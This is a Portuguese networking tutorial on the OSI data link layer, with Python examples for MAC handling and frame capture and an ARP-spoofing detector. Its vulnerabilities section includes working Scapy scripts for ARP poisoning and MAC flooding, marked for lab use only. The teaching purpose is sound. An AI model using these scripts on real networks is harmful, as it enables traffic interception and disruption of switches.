# Camada 2 — Enlace de Dados

## O que é?

A **Camada de Enlace** é responsável pela comunicação confiável entre dois dispositivos diretamente conectados. Ela pega os bits brutos da Camada Física e os organiza em **quadros (frames)**, além de detectar e corrigir erros de transmissão.

## Responsabilidades

- Enquadramento (framing) — empacotar bits em frames
- Endereçamento físico via **endereço MAC** (ex: `AA:BB:CC:DD:EE:FF`)
- Detecção e correção de erros (CRC, paridade)
- Controle de fluxo entre dispositivos adjacentes
- Controle de acesso ao meio (CSMA/CD no Ethernet)

## Subcamadas

| Subcamada | Nome | Função |
|---|---|---|
| LLC | Logical Link Control | Interface com a camada de rede |
| MAC | Media Access Control | Endereçamento e acesso ao meio |

## Dispositivos

- **Switch** — comuta quadros pelo endereço MAC
- **Bridge** — conecta segmentos de rede no nível de enlace

## Exemplo de código — Leitura de endereço MAC e captura de frames

```python
# Python — Obtendo o endereço MAC das interfaces de rede
import uuid
import socket
import struct

# Obtendo MAC da máquina local
mac = uuid.getnode()
mac_formatado = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
print(f"Endereço MAC local: {mac_formatado}")

# Capturando frames Ethernet brutos (requer permissão root no Linux)
def capturar_frame_ethernet():
    # ETH_P_ALL = captura todos os protocolos
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    
    raw_data, addr = sock.recvfrom(65536)
    
    # Parseando o cabeçalho Ethernet (primeiros 14 bytes)
    dest_mac = raw_data[0:6]
    src_mac  = raw_data[6:12]
    eth_type = struct.unpack('!H', raw_data[12:14])[0]
    
    def formatar_mac(bytes_mac):
        return ':'.join(f'{b:02X}' for b in bytes_mac)
    
    print(f"MAC Destino : {formatar_mac(dest_mac)}")
    print(f"MAC Origem  : {formatar_mac(src_mac)}")
    print(f"EtherType   : 0x{eth_type:04X}")
    
    sock.close()
```

```python
# Python — Construindo um frame Ethernet com Scapy
from scapy.all import Ether, sendp, sniff

# Criando um frame Ethernet manualmente
frame = Ether(
    dst="FF:FF:FF:FF:FF:FF",  # broadcast
    src="AA:BB:CC:DD:EE:FF",  # MAC origem
    type=0x0800               # IPv4
)

print(frame.summary())
# Ether / IP destino broadcast

# Capturando frames na interface
pacotes = sniff(iface="eth0", count=5, filter="ether")
for p in pacotes:
    print(p.summary())
```

## Curiosidade

> Dois dispositivos na mesma rede Wi-Fi se comunicam pela Camada 2 antes de qualquer roteamento acontecer. O Switch age puramente nessa camada, consultando sua **tabela MAC** para decidir por qual porta encaminhar cada frame.

---

## Vulnerabilidades e Riscos

### Principais ameaças

| Ataque / Risco | Descrição |
|---|---|
| **ARP Spoofing / Poisoning** | Envio de respostas ARP falsas para associar o MAC do atacante a um IP legítimo |
| **MAC Flooding** | Inundar a tabela CAM do switch com MACs falsos, forçando-o a agir como hub |
| **MAC Spoofing** | Falsificar o endereço MAC para contornar filtros de acesso (whitelists) |
| **VLAN Hopping** | Explorar configurações incorretas de trunk para acessar VLANs não autorizadas |
| **STP Attack** | Enviar BPDUs falsos para se tornar a bridge raiz e interceptar o tráfego |
| **CAM Table Overflow** | Variante do MAC Flooding — esgota a memória do switch |
| **Rogue DHCP** | Servidor DHCP malicioso na rede local entregando gateway/DNS falsos |

### Demonstração — ARP Spoofing e detecção

```python
# Python — Detectando ARP Spoofing na rede local
# ARP Spoofing é o ataque mais comum na Camada 2:
# o atacante anuncia que seu MAC corresponde ao IP do gateway,
# redirecionando todo o tráfego da vítima por ele (Man-in-the-Middle)

import subprocess
import re
from collections import defaultdict

def obter_tabela_arp() -> list[dict]:
    """Lê a tabela ARP do sistema operacional"""
    tabela = []
    try:
        saida = subprocess.check_output(["arp", "-n"]).decode()
        for linha in saida.strip().split('\n')[1:]:
            partes = linha.split()
            if len(partes) >= 3:
                tabela.append({
                    "ip" : partes[0],
                    "mac": partes[2],
                    "iface": partes[-1]
                })
    except Exception as e:
        print(f"Erro ao ler ARP: {e}")
    return tabela

def detectar_arp_spoofing(tabela: list[dict]) -> list[str]:
    """
    Detecta se dois IPs diferentes compartilham o mesmo MAC
    ou se um MAC está associado a múltiplos IPs — sinal de ARP Spoofing.
    """
    mac_para_ips = defaultdict(list)
    alertas = []

    for entrada in tabela:
        mac = entrada["mac"]
        ip  = entrada["ip"]
        if mac and mac != "(incomplete)":
            mac_para_ips[mac].append(ip)

    for mac, ips in mac_para_ips.items():
        if len(ips) > 1:
            alerta = f"⚠️  MAC {mac} associado a múltiplos IPs: {', '.join(ips)}"
            alertas.append(alerta)
            print(alerta)

    if not alertas:
        print("✅ Nenhuma duplicidade de MAC detectada na tabela ARP.")

    return alertas

tabela = obter_tabela_arp()
for entrada in tabela:
    print(f"  {entrada['ip']:16s} -> {entrada['mac']}")
print()
detectar_arp_spoofing(tabela)
```

```python
# Python — Construindo ARP Reply falso com Scapy (demonstração educacional)
# Mostra como um atacante envenena a tabela ARP de uma vítima
from scapy.all import ARP, Ether, sendp
import time

def arp_poison(ip_alvo: str, mac_alvo: str, ip_gateway: str, interface: str = "eth0"):
    """
    Envia ARP Replies falsos para o alvo, dizendo que o IP do gateway
    agora pertence ao MAC do atacante (esta máquina).
    USO: apenas em ambientes controlados e com autorização!
    """
    # Monta o frame: Ethernet + ARP Reply
    frame = Ether(dst=mac_alvo) / ARP(
        op=2,            # op=2 significa ARP Reply (is-at)
        pdst=ip_alvo,    # IP da vítima
        hwdst=mac_alvo,  # MAC da vítima
        psrc=ip_gateway  # anuncia que "sou" o gateway
        # hwsrc é preenchido automaticamente com o MAC desta máquina
    )
    
    print(f"Enviando ARP poison para {ip_alvo} (gateway: {ip_gateway})")
    try:
        for i in range(5):
            sendp(frame, iface=interface, verbose=False)
            print(f"  Pacote {i+1} enviado")
            time.sleep(1)
    except Exception as e:
        print(f"Erro: {e}")

# ATENÇÃO: use somente em lab/CTF com permissão explícita
# arp_poison("192.168.1.10", "aa:bb:cc:dd:ee:ff", "192.168.1.1")
```

```python
# Python — Simulando MAC Flooding (demonstração do conceito)
# Na prática, switches modernos têm proteção contra isso (port security)
from scapy.all import Ether, ARP, sendp
import random

def mac_aleatorio() -> str:
    return "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))

def simular_mac_flood(interface: str, quantidade: int = 100):
    """
    Envia frames com MACs de origem aleatórios.
    Em switches sem proteção, isso esgota a tabela CAM,
    fazendo o switch transmitir para todas as portas (como um hub).
    """
    print(f"Simulando MAC Flood — {quantidade} frames em {interface}")
    for i in range(quantidade):
        mac_src  = mac_aleatorio()
        mac_dst  = mac_aleatorio()
        frame = Ether(src=mac_src, dst=mac_dst)
        sendp(frame, iface=interface, verbose=False)
    print("Concluído.")

# SOMENTE em ambiente de laboratório isolado com autorização
# simular_mac_flood("eth0", quantidade=500)
```

### Mitigações

- **Dynamic ARP Inspection (DAI)** — switches verificam se respostas ARP são legítimas
- **Port Security** — limitar o número de MACs por porta do switch
- **802.1X (NAC)** — autenticação antes de conectar na rede (impede MAC Spoofing)
- **VLAN Segmentation** — separar tráfego sensível em VLANs dedicadas
- **DHCP Snooping** — bloquear servidores DHCP não autorizados
- **STP BPDU Guard** — rejeitar BPDUs em portas de acesso (previne STP Attack)